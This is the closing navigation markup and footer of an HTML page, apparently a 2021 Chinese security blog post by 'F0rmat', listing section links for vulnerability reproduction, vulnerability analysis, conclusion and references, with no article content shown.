                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-3">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            2. 漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x07-%e7%bb%93%e6%9d%9f">
                            0x07 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x08-%e5%8f%82%e8%80%83">
                            0x08 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
